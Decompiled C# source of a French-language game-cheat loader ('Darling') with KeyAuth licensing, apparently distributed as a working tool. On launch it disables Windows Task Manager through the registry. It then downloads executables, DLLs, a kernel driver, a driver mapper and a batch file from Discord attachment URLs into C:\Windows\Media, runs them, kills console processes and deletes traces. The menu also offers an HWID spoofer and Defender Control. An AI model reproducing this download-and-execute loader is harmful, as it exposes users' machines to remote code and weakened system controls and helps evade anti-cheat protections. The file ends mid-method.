using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Media;
using System.Net;
using System.Windows.Forms;
using KeyAuth;
using Microsoft.Win32;

namespace v1go
{
	// Token: 0x02000005 RID: 5
	public partial class Loader : Form
	{
		// Token: 0x0600001C RID: 28 RVA: 0x00002640 File Offset: 0x00000840
		public void disable()
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			bool flag = registryKey.GetValue("DisableTaskMgr") == null;
			if (flag)
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002684 File Offset: 0x00000884
		public void enable()
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.DeleteValue("DisableTaskMgr");
			registryKey.Close();
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002C5C File Offset: 0x00000E5C
		public Loader(string loginName)
		{
			this.username = loginName;
			this.InitializeComponent();
			base.FormBorderStyle = FormBorderStyle.None;
			base.WindowState = FormWindowState.Maximized;
			Loader.KeyAuthApp.init();
			this.disable();
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002CDC File Offset: 0x00000EDC
		private void Loader_Load(object sender, EventArgs e)
		{
			using (WebClient webClient = new WebClient())
			{
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/920072554276860024/ding.wav", "C:\\ding.wav");
			}
			SoundPlayer soundPlayer = new SoundPlayer("C:\\ding.wav");
			soundPlayer.Play();
			base.CenterToScreen();
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00002D38 File Offset: 0x00000F38
		private void btnCancel_Click(object sender, EventArgs e)
		{
			Process.Start("taskkill", "/F /IM DarlingFN.exe");
			Process.Start("taskkill", "/F /IM cmd.exe");
			Process.Start("taskkill", "/F /IM conhost.exe");
			Process.Start("taskkill", "/F /IM lmap.exe");
			Process.Start("taskkill", "/F /IM PaladinsHack.exe");
			Process.Start("taskkill", "/F /IM rustcheat.exe");
			Process.Start("taskkill", "/F /IM Darling_SOT.exe");
			Process.Start("taskkill", "/F /IM DarlingCookiesFiveM.exe");
			Process.Start("taskkill", "/F /IM DarlingR6S.exe");
			Process.Start("taskkill", "/F /IM DarlingValorant.exe");
			this.enable();
			Process.Start("taskkill", "/F /IM DarlingLoader.exe");
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002E00 File Offset: 0x00001000
		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			result = result.AddSeconds((double)unixtime).ToLocalTime();
			return result;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00002E38 File Offset: 0x00001038
		private void lstCheats_SelectedIndexChanged(object sender, EventArgs e)
		{
			SoundPlayer soundPlayer = new SoundPlayer("C:\\ding.wav");
			soundPlayer.Play();
			bool flag = this.lstCheats.SelectedItem.ToString() == "-";
			if (flag)
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/922103895315066991/original.gif", "C:\\original.gif");
				}
				this.pictureBox2.ImageLocation = "C:\\original.gif";
				this.lblGameName.Text = ".";
				this.lblGameName.ForeColor = Color.Gold;
				this.lblVersion.Text = "Version du jeux : NO DATA";
				bool flag2 = this.username.Contains("1");
				if (flag2)
				{
					this.lblDaysLeft.Text = "NO DATA";
					this.lblDaysLeft.ForeColor = Color.DarkRed;
				}
				else
				{
					this.lblDaysLeft.Text = "NO DATA";
					this.lblDaysLeft.ForeColor = Color.Green;
				}
				this.lblExpirationDate.Text = string.Format("Dernière detection : NO DATA", Array.Empty<object>());
				WebClient webClient2 = new WebClient();
				bool flag3 = !webClient2.DownloadString("https://pastebin.com/raw/ZvbXxF09").Contains("Unded");
				if (flag3)
				{
					this.lblStatus.Text = "NO DATA";
					this.lblStatus.ForeColor = Color.Orange;
				}
				else
				{
					this.lblStatus.Text = "NO DATA";
					this.lblStatus.ForeColor = Color.LimeGreen;
				}
				this.exeName = "csgo";
			}
			bool flag4 = this.lstCheats.SelectedItem.ToString() == "Fortnite - Chapitre 3";
			if (flag4)
			{
				using (WebClient webClient3 = new WebClient())
				{
					webClient3.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921901519161401354/Fortnite.jpg", "C:\\Fortnite.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\Fortnite.jpg";
				this.lblGameName.Text = "Fortnite - Battle Royale";
				this.lblGameName.ForeColor = Color.Gold;
				this.lblVersion.Text = "Version du jeux : 19.0";
				bool flag5 = this.username.Contains("1");
				if (flag5)
				{
					this.lblDaysLeft.Text = "KEY INVALIDE";
					this.lblDaysLeft.ForeColor = Color.DarkRed;
				}
				else
				{
					this.lblDaysLeft.Text = "KEY VALIDE";
					this.lblDaysLeft.ForeColor = Color.Green;
				}
				this.lblExpirationDate.Text = string.Format("Dernière detection : 17/08/2019", Array.Empty<object>());
				WebClient webClient4 = new WebClient();
				bool flag6 = !webClient4.DownloadString("https://pastebin.com/raw/ZvbXxF09").Contains("Undetected");
				if (flag6)
				{
					this.lblStatus.Text = "Testing";
					this.lblStatus.ForeColor = Color.Orange;
				}
				else
				{
					this.lblStatus.Text = "Undetected";
					this.lblStatus.ForeColor = Color.LimeGreen;
				}
				this.exeName = "csgo";
			}
			bool flag7 = this.lstCheats.SelectedItem.ToString() == "FiveM";
			if (flag7)
			{
				using (WebClient webClient5 = new WebClient())
				{
					webClient5.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921908076846673990/FiveM.jpg", "C:\\FiveM.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\FiveM.jpg";
				this.lblGameName.Text = "FiveM - Cfx.re";
				this.lblGameName.ForeColor = Color.Gold;
				this.lblVersion.Text = "Version du jeu: 1.1.0.0";
				bool flag8 = this.username.Contains("5");
				if (flag8)
				{
					this.lblDaysLeft.Text = "KEY INVALIDE";
					this.lblDaysLeft.ForeColor = Color.DarkRed;
				}
				else
				{
					this.lblDaysLeft.Text = "KEY VALIDE";
					this.lblDaysLeft.ForeColor = Color.Green;
				}
				this.lblExpirationDate.Text = string.Format("Dernière detection : Aucune", Array.Empty<object>());
				WebClient webClient6 = new WebClient();
				bool flag9 = !webClient6.DownloadString("https://pastebin.com/raw/cQ1g4d1r").Contains("Undetected");
				if (flag9)
				{
					this.lblStatus.Text = "Testing";
					this.lblStatus.ForeColor = Color.Orange;
				}
				else
				{
					this.lblStatus.Text = "Undetected";
					this.lblStatus.ForeColor = Color.LimeGreen;
				}
				this.exeName = "csgo";
			}
			bool flag10 = this.lstCheats.SelectedItem.ToString() == "Paladin";
			if (flag10)
			{
				using (WebClient webClient7 = new WebClient())
				{
					webClient7.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921908077270290462/paladin.jpg", "C:\\paladin.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\paladin.jpg";
				this.lblGameName.Text = "Paladins : Champions du Royaume";
				this.lblGameName.ForeColor = Color.Gold;
				this.lblVersion.Text = "Version du jeu: 4.7.4327.0";
				bool flag11 = this.username.Contains("6");
				if (flag11)
				{
					this.lblDaysLeft.Text = "KEY INVALIDE";
					this.lblDaysLeft.ForeColor = Color.DarkRed;
				}
				else
				{
					this.lblDaysLeft.Text = "KEY VALIDE";
					this.lblDaysLeft.ForeColor = Color.Green;
				}
				this.lblExpirationDate.Text = string.Format("Dernière detection : Aucune", Array.Empty<object>());
				WebClient webClient8 = new WebClient();
				bool flag12 = !webClient8.DownloadString("https://pastebin.com/raw/QnwkrNYJ").Contains("Undetected");
				if (flag12)
				{
					this.lblStatus.Text = "Testing";
					this.lblStatus.ForeColor = Color.Orange;
				}
				else
				{
					this.lblStatus.Text = "Undetected";
					this.lblStatus.ForeColor = Color.LimeGreen;
				}
				this.exeName = "csgo";
			}
			bool flag13 = this.lstCheats.SelectedItem.ToString() == "Propnight";
			if (flag13)
			{
				using (WebClient webClient9 = new WebClient())
				{
					webClient9.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921908077589061632/propnight.jpg", "C:\\propnight.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\propnight.jpg";
				this.lblGameName.Text = "PropNight";
				this.lblGameName.ForeColor = Color.Gold;
				this.lblVersion.Text = "Version du jeu: 4.3";
				bool flag14 = this.username.Contains("7");
				if (flag14)
				{
					this.lblDaysLeft.Text = "KEY INVALIDE";
					this.lblDaysLeft.ForeColor = Color.DarkRed;
				}
				else
				{
					this.lblDaysLeft.Text = "KEY VALIDE";
					this.lblDaysLeft.ForeColor = Color.Green;
				}
				this.lblExpirationDate.Text = string.Format("Dernière detection : Aucune", Array.Empty<object>());
				WebClient webClient10 = new WebClient();
				bool flag15 = !webClient10.DownloadString("https://pastebin.com/raw/mhLYkWVT").Contains("Undetected");
				if (flag15)
				{
					this.lblStatus.Text = "Testing";
					this.lblStatus.ForeColor = Color.Orange;
				}
				else
				{
					this.lblStatus.Text = "Undetected";
					this.lblStatus.ForeColor = Color.LimeGreen;
				}
				this.exeName = "csgo";
			}
			bool flag16 = this.lstCheats.SelectedItem.ToString() == "Rust";
			if (flag16)
			{
				using (WebClient webClient11 = new WebClient())
				{
					webClient11.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921908077815558164/rust.jpg", "C:\\rust.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\rust.jpg";
				this.lblGameName.Text = "Rust : Explore Build Survive";
				this.lblGameName.ForeColor = Color.Gold;
				this.lblVersion.Text = "Version du jeu: 1.56.0";
				bool flag17 = this.username.Contains("8");
				if (flag17)
				{
					this.lblDaysLeft.Text = "KEY INVALIDE";
					this.lblDaysLeft.ForeColor = Color.DarkRed;
				}
				else
				{
					this.lblDaysLeft.Text = "KEY VALIDE";
					this.lblDaysLeft.ForeColor = Color.Green;
				}
				this.lblExpirationDate.Text = string.Format("Dernière detection : Aucune", Array.Empty<object>());
				WebClient webClient12 = new WebClient();
				bool flag18 = !webClient12.DownloadString("https://pastebin.com/raw/0CXApcHY").Contains("Undetected");
				if (flag18)
				{
					this.lblStatus.Text = "Testing";
					this.lblStatus.ForeColor = Color.Orange;
				}
				else
				{
					this.lblStatus.Text = "Undetected";
					this.lblStatus.ForeColor = Color.LimeGreen;
				}
				this.exeName = "csgo";
			}
			bool flag19 = this.lstCheats.SelectedItem.ToString() == "Sea of Thieves";
			if (flag19)
			{
				using (WebClient webClient13 = new WebClient())
				{
					webClient13.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921908076125245451/sot.jpg", "C:\\sot.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\sot.jpg";
				this.lblGameName.Text = "Sea of Thieves";
				this.lblGameName.ForeColor = Color.Gold;
				this.lblVersion.Text = "Version du jeu: 2.4.0";
				bool flag20 = this.username.Contains("9");
				if (flag20)
				{
					this.lblDaysLeft.Text = "KEY INVALIDE";
					this.lblDaysLeft.ForeColor = Color.DarkRed;
				}
				else
				{
					this.lblDaysLeft.Text = "KEY VALIDE";
					this.lblDaysLeft.ForeColor = Color.Green;
				}
				this.lblExpirationDate.Text = string.Format("Dernière detection : Aucune", Array.Empty<object>());
				WebClient webClient14 = new WebClient();
				bool flag21 = !webClient14.DownloadString("https://pastebin.com/raw/PsxrPNty").Contains("Undetected");
				if (flag21)
				{
					this.lblStatus.Text = "Testing";
					this.lblStatus.ForeColor = Color.Orange;
				}
				else
				{
					this.lblStatus.Text = "Undetected";
					this.lblStatus.ForeColor = Color.LimeGreen;
				}
				this.exeName = "csgo";
			}
			bool flag22 = this.lstCheats.SelectedItem.ToString() == "Rainbow Six: Siege";
			if (flag22)
			{
				using (WebClient webClient15 = new WebClient())
				{
					webClient15.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921901450391593000/r6.jpg", "C:\\r6.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\r6.jpg";
				this.lblGameName.Text = "Tom Clancy's Rainbow Six: Siege";
				this.lblGameName.ForeColor = Color.Gold;
				this.lblVersion.Text = "Version du jeu: A6S4";
				bool flag23 = this.username.Contains("4");
				if (flag23)
				{
					this.lblDaysLeft.Text = "KEY INVALIDE";
					this.lblDaysLeft.ForeColor = Color.DarkRed;
				}
				else
				{
					this.lblDaysLeft.Text = "KEY VALIDE";
					this.lblDaysLeft.ForeColor = Color.Green;
				}
				this.lblExpirationDate.Text = string.Format("Dernière detection : 01/12/2021", Array.Empty<object>());
				WebClient webClient16 = new WebClient();
				bool flag24 = !webClient16.DownloadString("https://pastebin.com/raw/FPax1if7").Contains("Undetected");
				if (flag24)
				{
					this.lblStatus.Text = "Testing";
					this.lblStatus.ForeColor = Color.Orange;
				}
				else
				{
					this.lblStatus.Text = "Undetected";
					this.lblStatus.ForeColor = Color.LimeGreen;
				}
				this.exeName = "csgo";
			}
			bool flag25 = this.lstCheats.SelectedItem.ToString() == "Apex Legends";
			if (flag25)
			{
				using (WebClient webClient17 = new WebClient())
				{
					webClient17.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921908076494323742/apex.jpg", "C:\\apex.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\apex.jpg";
				this.lblGameName.Text = "Apex Legends";
				this.lblGameName.ForeColor = Color.Gold;
				this.lblVersion.Text = "Version du jeu: 11.0.1";
				bool flag26 = this.username.Contains("2");
				if (flag26)
				{
					this.lblDaysLeft.Text = "KEY INVALIDE";
					this.lblDaysLeft.ForeColor = Color.DarkRed;
				}
				else
				{
					this.lblDaysLeft.Text = "KEY VALIDE";
					this.lblDaysLeft.ForeColor = Color.Green;
				}
				this.lblExpirationDate.Text = string.Format("Dernière detection : 24/05/2020", Array.Empty<object>());
				WebClient webClient18 = new WebClient();
				bool flag27 = !webClient18.DownloadString("https://pastebin.com/raw/RSWxVdXs").Contains("Undetected");
				if (flag27)
				{
					this.lblStatus.Text = "Testing";
					this.lblStatus.ForeColor = Color.Orange;
				}
				else
				{
					this.lblStatus.Text = "Undetected";
					this.lblStatus.ForeColor = Color.LimeGreen;
				}
				this.exeName = "csgo";
			}
			bool flag28 = this.lstCheats.SelectedItem.ToString() == "Valorant";
			if (flag28)
			{
				using (WebClient webClient19 = new WebClient())
				{
					webClient19.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921901539667361843/valo.jpg", "C:\\valo.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\valo.jpg";
				this.lblGameName.Text = "Valorant";
				this.lblGameName.ForeColor = Color.Gold;
				this.lblVersion.Text = "Version: 3.10.1";
				bool flag29 = this.username.Contains("3");
				if (flag29)
				{
					this.lblDaysLeft.Text = "KEY INVALIDE";
					this.lblDaysLeft.ForeColor = Color.DarkRed;
				}
				else
				{
					this.lblDaysLeft.Text = "KEY VALIDE";
					this.lblDaysLeft.ForeColor = Color.Green;
				}
				this.lblExpirationDate.Text = string.Format("Dernière detection : 19/11/2021", Array.Empty<object>());
				WebClient webClient20 = new WebClient();
				bool flag30 = !webClient20.DownloadString("https://pastebin.com/raw/dyLdGmfE").Contains("Undetected");
				if (flag30)
				{
					this.lblStatus.Text = "Testing";
					this.lblStatus.ForeColor = Color.Orange;
				}
				else
				{
					this.lblStatus.Text = "Undetected";
					this.lblStatus.ForeColor = Color.LimeGreen;
				}
				this.exeName = "csgo";
			}
			bool flag31 = this.lstCheats.SelectedItem.ToString() == "Forcer EAC/BE";
			if (flag31)
			{
				using (WebClient webClient21 = new WebClient())
				{
					webClient21.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921915247713992784/eac.jpg", "C:\\eac.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\eac.jpg";
				this.lblGameName.Text = "Forcer EAC / BE";
				this.lblVersion.Text = "Version: 19.0";
				this.lblExpirationDate.Text = string.Format("Fonctionne depuis : 2019", Array.Empty<object>());
				this.lblStatus.Text = "Fonctionnel";
				this.lblStatus.ForeColor = Color.LimeGreen;
				this.lblDaysLeft.Text = "Darling <33";
				this.lblDaysLeft.ForeColor = Color.MediumPurple;
				this.exeName = "csgo";
			}
			bool flag32 = this.lstCheats.SelectedItem.ToString() == "Windows Activation";
			if (flag32)
			{
				using (WebClient webClient22 = new WebClient())
				{
					webClient22.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921915248036962354/windows.jpg", "C:\\windows.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\windows.jpg";
				this.lblGameName.Text = "Windows Activation";
				this.lblVersion.Text = "Version: Windows 10 ";
				this.lblExpirationDate.Text = string.Format("Fonctionne depuis : 2016", Array.Empty<object>());
				this.lblDaysLeft.Text = "Darling <33";
				this.lblDaysLeft.ForeColor = Color.MediumPurple;
				this.lblStatus.Text = "Fonctionnel";
				this.lblStatus.ForeColor = Color.LimeGreen;
				this.exeName = "csgo";
			}
			bool flag33 = this.lstCheats.SelectedItem.ToString() == "Defender Control";
			if (flag33)
			{
				using (WebClient webClient23 = new WebClient())
				{
					webClient23.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921915247495880714/defender.jpg", "C:\\defender.jpg");
				}
				this.pictureBox2.ImageLocation = "C:\\defender.jpg";
				this.lblGameName.Text = "Defender Control";
				this.lblVersion.Text = "Version: ?";
				this.lblExpirationDate.Text = string.Format("Fonctionne depuis : 2019", Array.Empty<object>());
				this.lblDaysLeft.Text = "Darling <33";
				this.lblDaysLeft.ForeColor = Color.MediumPurple;
				this.lblStatus.Text = "Fonctionnel";
				this.lblStatus.ForeColor = Color.LimeGreen;
				this.exeName = "csgo";
			}
			bool flag34 = this.lstCheats.SelectedItem.ToString() == "Cleaner Fortnite";
			if (flag34)
			{
				using (WebClient webClient24 = new WebClient())
				{
					webClient24.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921915247286190171/Cleaner.png", "C:\\Cleaner.png");
				}
				this.pictureBox2.ImageLocation = "C:\\Cleaner.png";
				this.lblGameName.Text = "Cleaner Fortnite";
				this.lblVersion.Text = "Version: 4";
				this.lblExpirationDate.Text = string.Format("Fonctionne depuis : 2021", Array.Empty<object>());
				this.lblDaysLeft.Text = "Darling <33";
				this.lblDaysLeft.ForeColor = Color.MediumPurple;
				this.lblStatus.Text = "Fonctionnel";
				this.lblStatus.ForeColor = Color.LimeGreen;
				this.exeName = "csgo";
			}
			bool flag35 = this.lstCheats.SelectedItem.ToString() == "HWID Spoofer";
			if (flag35)
			{
				using (WebClient webClient25 = new WebClient())
				{
					webClient25.DownloadFile("https://media.discordapp.net/attachments/900381847819784243/921915247286190171/Cleaner.png", "C:\\Cleaner.png");
				}
				this.pictureBox2.ImageLocation = "C:\\Cleaner.png";
				this.lblGameName.Text = "HWID Spoofer";
				this.lblVersion.Text = "Version: 6.6.6";
				this.lblExpirationDate.Text = string.Format("Fonctionne depuis : 2021", Array.Empty<object>());
				this.lblDaysLeft.Text = "Darling <33";
				this.lblDaysLeft.ForeColor = Color.MediumPurple;
				this.lblStatus.Text = "Fonctionnel";
				this.lblStatus.ForeColor = Color.LimeGreen;
				this.exeName = "csgo";
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00002126 File Offset: 0x00000326
		private void btnLoad_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00002126 File Offset: 0x00000326
		private void lblExpiry_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00002126 File Offset: 0x00000326
		private void lblWelcome_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00002126 File Offset: 0x00000326
		private void grpCheatInfo_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x06000027 RID: 39 RVA: 0x000042E0 File Offset: 0x000024E0
		private void button1_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			bool flag = this.lstCheats.SelectedItem.ToString() == "Valorant";
			if (flag)
			{
				bool flag2 = !webClient.DownloadString("https://pastebin.com/raw/xTt1rMKx").Contains("Work") || this.username.Contains("3");
				if (flag2)
				{
					string text = "Votre clé n'est pas valide pour se cheat ou celui-ci est en maitenance.";
					string caption = "Informations !";
					MessageBoxButtons buttons = MessageBoxButtons.OK;
					DialogResult dialogResult = MessageBox.Show(text, caption, buttons);
					bool flag3 = dialogResult == DialogResult.OK;
					if (flag3)
					{
					}
				}
				else
				{
					using (WebClient webClient2 = new WebClient())
					{
						webClient2.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/917542516205686834/DarlingValorant.exe", "C:\\Windows\\Media\\DarlingValorant.exe");
					}
					Process.Start("C:\\Windows\\Media\\DarlingValorant.exe");
					WaitForGame waitForGame = new WaitForGame(this.lstCheats.SelectedItem.ToString().Trim(), this.exeName);
					waitForGame.ShowDialog();
				}
			}
			bool flag4 = this.lstCheats.SelectedItem.ToString() == "Fortnite - Chapitre 3";
			if (flag4)
			{
				bool flag5 = !webClient.DownloadString("https://pastebin.com/raw/eEHm8cY0").Contains("Work") || this.username.Contains("1");
				if (flag5)
				{
					string text2 = "Votre clé n'est pas valide pour se cheat ou celui-ci est en maitenance.";
					string caption2 = "Informations !";
					MessageBoxButtons buttons2 = MessageBoxButtons.OK;
					DialogResult dialogResult2 = MessageBox.Show(text2, caption2, buttons2);
					bool flag6 = dialogResult2 == DialogResult.OK;
					if (flag6)
					{
					}
				}
				else
				{
					using (WebClient webClient3 = new WebClient())
					{
						webClient3.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/922265108258910258/settings.sys", "C:\\Windows\\Media\\settings.sys");
					}
					using (WebClient webClient4 = new WebClient())
					{
						webClient4.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/922265108095307836/loaddrv.bat", "C:\\Windows\\Media\\loaddrv.bat");
					}
					using (WebClient webClient5 = new WebClient())
					{
						webClient5.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/922265107931746364/mapper.exe", "C:\\Windows\\Media\\mapper.exe");
					}
					using (WebClient webClient6 = new WebClient())
					{
						webClient6.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/922265729619865611/DarlingFN.exe", "C:\\Windows\\Media\\DarlingFN.exe");
					}
					Process.Start("C:\\Windows\\Media\\loaddrv.bat");
					WaitForGame waitForGame2 = new WaitForGame(this.lstCheats.SelectedItem.ToString().Trim(), this.exeName);
					waitForGame2.ShowDialog();
					Process.Start("taskkill", "/F /IM cmd.exe");
					string text3 = "Press 'ok' in lobby.";
					string caption3 = "Injector !";
					MessageBoxButtons buttons3 = MessageBoxButtons.OK;
					DialogResult dialogResult3 = MessageBox.Show(text3, caption3, buttons3);
					bool flag7 = dialogResult3 == DialogResult.OK;
					if (flag7)
					{
						Process.Start("C:\\Windows\\Media\\DarlingFN.exe");
						WaitForGame waitForGame3 = new WaitForGame(this.lstCheats.SelectedItem.ToString().Trim(), this.exeName);
						waitForGame3.ShowDialog();
						File.Delete("C:\\Windows\\Media\\mapper.exe");
						File.Delete("C:\\Windows\\Media\\loaddrv.bat");
						File.Delete("C:\\Windows\\Media\\settings.sys");
						WaitForGame waitForGame4 = new WaitForGame(this.lstCheats.SelectedItem.ToString().Trim(), this.exeName);
						waitForGame4.ShowDialog();
					}
				}
			}
			bool flag8 = this.lstCheats.SelectedItem.ToString() == "Rainbow Six: Siege";
			if (flag8)
			{
				bool flag9 = !webClient.DownloadString("https://pastebin.com/raw/FX0KLgTy").Contains("Work") || this.username.Contains("4");
				if (flag9)
				{
					string text4 = "Votre clé n'est pas valide pour se cheat ou celui-ci est en maitenance.";
					string caption4 = "Informations !";
					MessageBoxButtons buttons4 = MessageBoxButtons.OK;
					DialogResult dialogResult4 = MessageBox.Show(text4, caption4, buttons4);
					bool flag10 = dialogResult4 == DialogResult.OK;
					if (flag10)
					{
					}
				}
				else
				{
					using (WebClient webClient7 = new WebClient())
					{
						webClient7.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/918926469533687858/DarlingR6S.exe", "C:\\Windows\\Media\\DarlingR6S.exe");
					}
					Process.Start("C:\\Windows\\Media\\DarlingR6S.exe");
					WaitForGame waitForGame5 = new WaitForGame(this.lstCheats.SelectedItem.ToString().Trim(), this.exeName);
					waitForGame5.ShowDialog();
				}
			}
			bool flag11 = this.lstCheats.SelectedItem.ToString() == "FiveM";
			if (flag11)
			{
				bool flag12 = !webClient.DownloadString("https://pastebin.com/raw/maYTzuXh").Contains("Work") || this.username.Contains("5");
				if (flag12)
				{
					string text5 = "Votre clé n'est pas valide pour se cheat ou celui-ci est en maitenance.";
					string caption5 = "Informations !";
					MessageBoxButtons buttons5 = MessageBoxButtons.OK;
					DialogResult dialogResult5 = MessageBox.Show(text5, caption5, buttons5);
					bool flag13 = dialogResult5 == DialogResult.OK;
					if (flag13)
					{
					}
				}
				else
				{
					using (WebClient webClient8 = new WebClient())
					{
						webClient8.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/920066748194111538/DarlingCookiesFiveM.exe", "C:\\Windows\\Media\\DarlingCookiesFiveM.exe");
					}
					using (WebClient webClient9 = new WebClient())
					{
						webClient9.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/920066748395425844/InfantryCheats_-_FiveM.dll", "C:\\Windows\\Media\\InfantryCheats - FiveM.dll");
					}
					Process.Start("C:\\Windows\\Media\\DarlingCookiesFiveM.exe");
					WaitForGame waitForGame6 = new WaitForGame(this.lstCheats.SelectedItem.ToString().Trim(), this.exeName);
					waitForGame6.ShowDialog();
				}
			}
			bool flag14 = this.lstCheats.SelectedItem.ToString() == "Rust";
			if (flag14)
			{
				bool flag15 = !webClient.DownloadString("https://pastebin.com/raw/GNcHSdnA").Contains("Work") || this.username.Contains("8");
				if (flag15)
				{
					string text6 = "Votre clé n'est pas valide pour se cheat ou celui-ci est en maitenance.";
					string caption6 = "Informations !";
					MessageBoxButtons buttons6 = MessageBoxButtons.OK;
					DialogResult dialogResult6 = MessageBox.Show(text6, caption6, buttons6);
					bool flag16 = dialogResult6 == DialogResult.OK;
					if (flag16)
					{
					}
				}
				else
				{
					using (WebClient webClient10 = new WebClient())
					{
						webClient10.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/920067331529523231/rustcheat.exe", "C:\\Windows\\Media\\rustcheat.exe");
					}
					Process.Start("C:\\Windows\\Media\\rustcheat.exe");
					WaitForGame waitForGame7 = new WaitForGame(this.lstCheats.SelectedItem.ToString().Trim(), this.exeName);
					waitForGame7.ShowDialog();
				}
			}
			bool flag17 = this.lstCheats.SelectedItem.ToString() == "Paladin";
			if (flag17)
			{
				bool flag18 = !webClient.DownloadString("https://pastebin.com/raw/KtLKK28x").Contains("Work") || this.username.Contains("6");
				if (flag18)
				{
					string text7 = "Votre clé n'est pas valide pour se cheat ou celui-ci est en maitenance.";
					string caption7 = "Informations !";
					MessageBoxButtons buttons7 = MessageBoxButtons.OK;
					DialogResult dialogResult7 = MessageBox.Show(text7, caption7, buttons7);
					bool flag19 = dialogResult7 == DialogResult.OK;
					if (flag19)
					{
					}
				}
				else
				{
					using (WebClient webClient11 = new WebClient())
					{
						webClient11.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/920068489430073384/PaladinsHack.exe", "C:\\Windows\\Media\\PaladinsHack.exe");
					}
					Process.Start("C:\\Windows\\Media\\PaladinsHack.exe");
					WaitForGame waitForGame8 = new WaitForGame(this.lstCheats.SelectedItem.ToString().Trim(), this.exeName);
					waitForGame8.ShowDialog();
				}
			}
			bool flag20 = this.lstCheats.SelectedItem.ToString() == "Propnight";
			if (flag20)
			{
				bool flag21 = !webClient.DownloadString("https://pastebin.com/raw/Tgdx3MS7").Contains("Work") || this.username.Contains("7");
				if (flag21)
				{
					string text8 = "Votre clé n'est pas valide pour se cheat ou celui-ci est en maitenance.";
					string caption8 = "Informations !";
					MessageBoxButtons buttons8 = MessageBoxButtons.OK;
					DialogResult dialogResult8 = MessageBox.Show(text8, caption8, buttons8);
					bool flag22 = dialogResult8 == DialogResult.OK;
					if (flag22)
					{
					}
				}
				else
				{
					using (WebClient webClient12 = new WebClient())
					{
						webClient12.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/920069118374338620/DarlingPropnight.dll", "C:\\Windows\\Media\\DarlingPropnight.dll");
					}
					WaitForGame waitForGame9 = new WaitForGame(this.lstCheats.SelectedItem.ToString().Trim(), this.exeName);
					waitForGame9.ShowDialog();
				}
			}
			bool flag23 = this.lstCheats.SelectedItem.ToString() == "Sea of Thieves";
			if (flag23)
			{
				bool flag24 = !webClient.DownloadString("https://pastebin.com/raw/zz6qi86B").Contains("Work") || this.username.Contains("9");
				if (flag24)
				{
					string text9 = "Votre clé n'est pas valide pour se cheat ou celui-ci est en maitenance.";
					string caption9 = "Informations !";
					MessageBoxButtons buttons9 = MessageBoxButtons.OK;
					DialogResult dialogResult9 = MessageBox.Show(text9, caption9, buttons9);
					bool flag25 = dialogResult9 == DialogResult.OK;
					if (flag25)
					{
					}
				}
				else
				{
					using (WebClient webClient13 = new WebClient())
					{
						webClient13.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/919423981256318986/Darling_SOT.exe", "C:\\Windows\\Media\\Darling_SOT.exe");
					}
					Process.Start("C:\\Windows\\Media\\Darling_SOT.exe");
					WaitForGame waitForGame10 = new WaitForGame(this.lstCheats.SelectedItem.ToString().Trim(), this.exeName);
					waitForGame10.ShowDialog();
				}
			}
			bool flag26 = this.lstCheats.SelectedItem.ToString() == "Apex Legends";
			if (flag26)
			{
				bool flag27 = !webClient.DownloadString("https://pastebin.com/raw/WX0pkLHQ").Contains("Work") || this.username.Contains("2");
				if (flag27)
				{
